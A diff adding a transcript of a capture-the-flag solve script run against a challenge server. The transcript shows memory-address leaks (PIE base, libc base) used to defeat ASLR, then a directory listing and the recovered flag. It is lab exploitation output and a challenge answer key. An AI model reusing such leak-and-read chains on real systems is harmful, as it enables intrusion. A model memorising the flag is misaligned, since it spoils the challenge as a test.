@@ -1,0 +1,13 @@
+$ python3 solve.py undertow-aa6bcbd8568d.chals.z0d1ak.org 1337 \
+    --seal 4eaf20afbf05b2f1805d0261950df065
+[+] recovered seal: 4eaf20afbf05b2f1805d0261950df065
+[+] checkpoint alias route: [0, 0, 5, 0, 0] (snapshot list 1)
+[+] target session: 0164e4ffc81315e0
+[+] PIE base:     0x55ff6e27d000
+[+] scratch map:  0x203482812000
+[+] write@libc:   0x7f1514c15690
+[+] libc base:    0x7f1514af9000
+[+] directory:    ['.', '..', 'flag_de56852d']
+[+] opening:      flag_de56852d
+zdk{4_ST4L3_CheckP0INt_s4nK_BeLOW_The_pOInTER_gUarD}
+[+] flag: zdk{4_ST4L3_CheckP0INt_s4nK_BeLOW_The_pOInTER_gUarD}
